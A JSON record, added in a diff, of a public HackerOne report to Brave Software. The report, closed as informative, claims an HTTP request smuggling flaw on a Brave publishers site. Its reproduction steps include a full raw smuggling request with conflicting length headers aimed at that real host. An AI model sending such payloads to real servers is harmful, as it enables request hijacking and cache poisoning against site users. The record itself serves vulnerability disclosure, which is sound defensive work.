@@ -1,0 +1,148 @@
+{
+  "id": 866382,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjYzODI=",
+  "url": "https://hackerone.com/reports/866382",
+  "title": "HTTP Request Smuggling",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2020-05-05T11:39:58.197Z",
+  "submitted_at": "2020-05-05T11:39:58.197Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dracomalfoy",
+    "url": "/dracomalfoy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/JKV1n7g9Ke3ETwV1Y8kZCcFN/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-06-04T00:52:31.476Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-06-02T12:18:31.601Z",
+  "team_member_agreed_on_going_public_at": "2020-06-04T00:52:31.412Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to \"smuggle\" a request to one device without the other device being aware of it. \n\n publishers.basicattentiontoken.org is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.\n\n## Products affected: \n\nBrave Website. : publishers.basicattentiontoken.org\n\n## Steps To Reproduce:\n1.  Run the burp suite turbo intruder on the following request\n\n```\nPOST /publishers/registrations.json HTTP/1.1\nHost: publishers.basicattentiontoken.org\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://publishers.basicattentiontoken.org/sign-up\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json\nOrigin: https://publishers.basicattentiontoken.org\nContent-Length: 136\nDNT: 1\nConnection: close\nTransfer-encoding: chunked\n\n35\n{\"terms_of_service\":true,\"email\":\"dhfs@kdjfksd.dfks\"}\n00\n\nGET /assets/muli/Muli-Bold-ecdc1a24a0a56f42da0ee128d4c2e35235ef86acfbf98aab933aeb9cc5813bed.woff2 HTTP/1.1\nHost: publishers.basicattentiontoken.org\nfoo: x\n\n\n```\n\n2. Script for tubro Intruder is attached. Word list can be any list containing any characters.\n3. Observe 200 OK response for the /publishers/registrations.json post request which is supposed to give {\"message\":\"Unverified request\"}. Please refer the attached screenshot ( Smuggle Request1.png ) whih contain the expected response. \n4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A seprate report is attached as well.\n\n\nAny suggestions or improvement in reports are welcome as this is my first report.\n\n## Impact\n\nIt is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation  and cache poisoning can be the impact of this vulnerability as well.\nAs unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.\n\nFor more information about the vulnerability please refer :\n https://cwe.mitre.org/data/definitions/444.html ;\n  https://capec.mitre.org/data/definitions/33.html",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 815938,
+      "file_name": "Scripts.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dSuW9tcBe4UjBmgP1kSADYZ9?response-content-disposition=attachment%3B%20filename%3D%22Scripts.txt%22%3B%20filename%2A%3DUTF-8%27%27Scripts.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DU5GKF4%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151916Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCrQKyduZZSWpEa7lQMN1p4%2Fg3sVJGOZNwC3ZYR7%2BzycQIgbO5CkantWicBlLfZ3bxbC0XlhZro4xbuhPuDBKRdVAIqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBSQe56SuRqu2QVvTyqOBT4i9V77BanEH%2FGYmI11rEM55QdB3rIobpS5%2FjxyyMXKITycwIp%2B4ayHD3XZB4N%2FYY49mJGMUJzAIMHJdrEDZj%2FtME%2FiqdZBBHabD9xJ69%2FS9GPJWJBsaxSE3yEpRpnG3rXLoGIaI0IpS6%2B6VxL6tAG%2FmgR5wAXTpSRbQZbB938sNkSHfVWqCjL9HqTAfYobL%2BNM3yS09eA0f4Lqk0pJq8BuOZCmC2%2FweM1ZRosbQhGb8x%2B4F2XrzQHTXQXx8uFhr9hAL%2BrZ%2FMMZgX52azruzAaMMyLX9rkdwZDGYVvn3xmHKjxD%2F%2FAGiQcSFG2Vr941ofF%2B6%2BPHu%2BjJQMYvEk9R7QUCi43JpR1GcFdql%2BfMFAtu%2FitFOfBHcrR4gHixnRAfqDCOeM7MpPeq44t%2FirIITaflUg%2BdX2d7vqC%2B8tl%2FYPVE35IQpjB5REdOuOAHweGkZiaEHdxOBhdujXn5I3Ubnm2vq2%2FvhukewEaBlWBjW%2BVKjTOg7qCyQE7JZWj0RNKFiIsBnwfzKoJPy9rmhIOnShe%2FG92%2B83U2Ya3u0fTl4XugNh9Yrgp%2FRrBd1rxfcrUnZhgkRvOmzXw%2BAI2Tt9jukZQsLFrC5g0O0jljRuOut8hkMVojkBSFrk4MghR6rdPiCZsCua%2FcELUNkLX2VR6WSopllx95eh%2B9oGGVM%2Fc9mFoxlGj871FZOjKC%2BbupQtxkkYth1pePLoR2ElI0MQ2RlXgQLpZEmEhjObLpoRGcw787NHxHAgqKl1gN3Fj2ln1QHnkOWbJSP%2BpZs7jxZ9Zwy9mJ4pXvXn0zjaP%2FA7%2FUIBDCNb9QZdlzTYVklK9xEilmqIsjym9sJEMiBcYxHh8jEYH4wZgKHxRkkPHsgqEu%2FzDKi%2F3PBjqxASuspeEpRMQxbEopnX438NIm1UM1ErK9dmrje6ul%2BxExALlTvNbEkds3MRmm5Eszvbcmdq%2BRr0gS91HN4yDOxTHDmKrK7NaYJhXou1ldxYpcLWytN88C9p0a5T54OwwGn8WbTqxnn8vQLOoBENn8QVq40Bp0gB5kTAZfQYO0k3Wu3IVbRBH%2F%2BLCCRFyoaHdInJIaPAmx2Hx7bW4kebRsQGm4qOZkPOe4pfAiF91I3MlHiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a733ccea453d74afcab3019495ae727ac6b68a85a72dac763568c6d67ab51fc6",
+      "file_size": 566,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 815940,
+      "file_name": "SmuggleRequest1..PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XATpwgnd4YwdTJbKHZrFBdVz?response-content-disposition=attachment%3B%20filename%3D%22SmuggleRequest1..PNG%22%3B%20filename%2A%3DUTF-8%27%27SmuggleRequest1..PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DU5GKF4%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151916Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCrQKyduZZSWpEa7lQMN1p4%2Fg3sVJGOZNwC3ZYR7%2BzycQIgbO5CkantWicBlLfZ3bxbC0XlhZro4xbuhPuDBKRdVAIqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBSQe56SuRqu2QVvTyqOBT4i9V77BanEH%2FGYmI11rEM55QdB3rIobpS5%2FjxyyMXKITycwIp%2B4ayHD3XZB4N%2FYY49mJGMUJzAIMHJdrEDZj%2FtME%2FiqdZBBHabD9xJ69%2FS9GPJWJBsaxSE3yEpRpnG3rXLoGIaI0IpS6%2B6VxL6tAG%2FmgR5wAXTpSRbQZbB938sNkSHfVWqCjL9HqTAfYobL%2BNM3yS09eA0f4Lqk0pJq8BuOZCmC2%2FweM1ZRosbQhGb8x%2B4F2XrzQHTXQXx8uFhr9hAL%2BrZ%2FMMZgX52azruzAaMMyLX9rkdwZDGYVvn3xmHKjxD%2F%2FAGiQcSFG2Vr941ofF%2B6%2BPHu%2BjJQMYvEk9R7QUCi43JpR1GcFdql%2BfMFAtu%2FitFOfBHcrR4gHixnRAfqDCOeM7MpPeq44t%2FirIITaflUg%2BdX2d7vqC%2B8tl%2FYPVE35IQpjB5REdOuOAHweGkZiaEHdxOBhdujXn5I3Ubnm2vq2%2FvhukewEaBlWBjW%2BVKjTOg7qCyQE7JZWj0RNKFiIsBnwfzKoJPy9rmhIOnShe%2FG92%2B83U2Ya3u0fTl4XugNh9Yrgp%2FRrBd1rxfcrUnZhgkRvOmzXw%2BAI2Tt9jukZQsLFrC5g0O0jljRuOut8hkMVojkBSFrk4MghR6rdPiCZsCua%2FcELUNkLX2VR6WSopllx95eh%2B9oGGVM%2Fc9mFoxlGj871FZOjKC%2BbupQtxkkYth1pePLoR2ElI0MQ2RlXgQLpZEmEhjObLpoRGcw787NHxHAgqKl1gN3Fj2ln1QHnkOWbJSP%2BpZs7jxZ9Zwy9mJ4pXvXn0zjaP%2FA7%2FUIBDCNb9QZdlzTYVklK9xEilmqIsjym9sJEMiBcYxHh8jEYH4wZgKHxRkkPHsgqEu%2FzDKi%2F3PBjqxASuspeEpRMQxbEopnX438NIm1UM1ErK9dmrje6ul%2BxExALlTvNbEkds3MRmm5Eszvbcmdq%2BRr0gS91HN4yDOxTHDmKrK7NaYJhXou1ldxYpcLWytN88C9p0a5T54OwwGn8WbTqxnn8vQLOoBENn8QVq40Bp0gB5kTAZfQYO0k3Wu3IVbRBH%2F%2BLCCRFyoaHdInJIaPAmx2Hx7bW4kebRsQGm4qOZkPOe4pfAiF91I3MlHiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ef87c6dcb60f96dffd1c755202a1ba9cc7021fe8e1516f8900d318b4e0b69b8c",
+      "file_size": 75680,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 815943,
+      "file_name": "FinalResponse..PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fezRMRVzxTm8gA5MywRoH5ip?response-content-disposition=attachment%3B%20filename%3D%22FinalResponse..PNG%22%3B%20filename%2A%3DUTF-8%27%27FinalResponse..PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DU5GKF4%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151916Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCrQKyduZZSWpEa7lQMN1p4%2Fg3sVJGOZNwC3ZYR7%2BzycQIgbO5CkantWicBlLfZ3bxbC0XlhZro4xbuhPuDBKRdVAIqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBSQe56SuRqu2QVvTyqOBT4i9V77BanEH%2FGYmI11rEM55QdB3rIobpS5%2FjxyyMXKITycwIp%2B4ayHD3XZB4N%2FYY49mJGMUJzAIMHJdrEDZj%2FtME%2FiqdZBBHabD9xJ69%2FS9GPJWJBsaxSE3yEpRpnG3rXLoGIaI0IpS6%2B6VxL6tAG%2FmgR5wAXTpSRbQZbB938sNkSHfVWqCjL9HqTAfYobL%2BNM3yS09eA0f4Lqk0pJq8BuOZCmC2%2FweM1ZRosbQhGb8x%2B4F2XrzQHTXQXx8uFhr9hAL%2BrZ%2FMMZgX52azruzAaMMyLX9rkdwZDGYVvn3xmHKjxD%2F%2FAGiQcSFG2Vr941ofF%2B6%2BPHu%2BjJQMYvEk9R7QUCi43JpR1GcFdql%2BfMFAtu%2FitFOfBHcrR4gHixnRAfqDCOeM7MpPeq44t%2FirIITaflUg%2BdX2d7vqC%2B8tl%2FYPVE35IQpjB5REdOuOAHweGkZiaEHdxOBhdujXn5I3Ubnm2vq2%2FvhukewEaBlWBjW%2BVKjTOg7qCyQE7JZWj0RNKFiIsBnwfzKoJPy9rmhIOnShe%2FG92%2B83U2Ya3u0fTl4XugNh9Yrgp%2FRrBd1rxfcrUnZhgkRvOmzXw%2BAI2Tt9jukZQsLFrC5g0O0jljRuOut8hkMVojkBSFrk4MghR6rdPiCZsCua%2FcELUNkLX2VR6WSopllx95eh%2B9oGGVM%2Fc9mFoxlGj871FZOjKC%2BbupQtxkkYth1pePLoR2ElI0MQ2RlXgQLpZEmEhjObLpoRGcw787NHxHAgqKl1gN3Fj2ln1QHnkOWbJSP%2BpZs7jxZ9Zwy9mJ4pXvXn0zjaP%2FA7%2FUIBDCNb9QZdlzTYVklK9xEilmqIsjym9sJEMiBcYxHh8jEYH4wZgKHxRkkPHsgqEu%2FzDKi%2F3PBjqxASuspeEpRMQxbEopnX438NIm1UM1ErK9dmrje6ul%2BxExALlTvNbEkds3MRmm5Eszvbcmdq%2BRr0gS91HN4yDOxTHDmKrK7NaYJhXou1ldxYpcLWytN88C9p0a5T54OwwGn8WbTqxnn8vQLOoBENn8QVq40Bp0gB5kTAZfQYO0k3Wu3IVbRBH%2F%2BLCCRFyoaHdInJIaPAmx2Hx7bW4kebRsQGm4qOZkPOe4pfAiF91I3MlHiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d380725ef238b91f32864a4e3466ecb2718295db4b4c7822f27d70a9059a8796",
+      "file_size": 112612,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 12,
+  "voters": [
+    "rook1337",
+    "iamgk808",
+    "brahim_boufakri01",
+    "zimmer75",
+    "mr_jay",
+    "nixguy",
+    "sadoreis58",
+    "abdu21",
+    "minhtuanact",
+    "ud1116_sv",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 7967,
+    "asset_type": "URL",
+    "asset_identifier": "creators.basicattentiontoken.org",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
